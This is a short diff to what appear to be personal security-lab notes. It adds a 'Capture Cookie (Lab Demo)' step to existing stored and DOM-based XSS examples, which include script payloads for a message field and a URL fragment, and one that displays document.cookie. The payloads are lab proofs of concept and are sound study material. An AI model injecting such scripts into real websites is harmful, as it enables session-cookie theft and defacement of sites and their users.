@@ -58,6 +58,10 @@ name:<h1>hacked
 message:<script>alert('Stored XSS')</script>
 DOM based XSS
 in the url bar add #<script>alert('DOM XSS')</script>
+
+Step 6: Capture Cookie (Lab Demo)
+In Stored XSS Message box:
+<script>alert(document.cookie)</script>
 =================================================================================================================================================================================
 //eml analyser and virus total
 login into your email and download any message
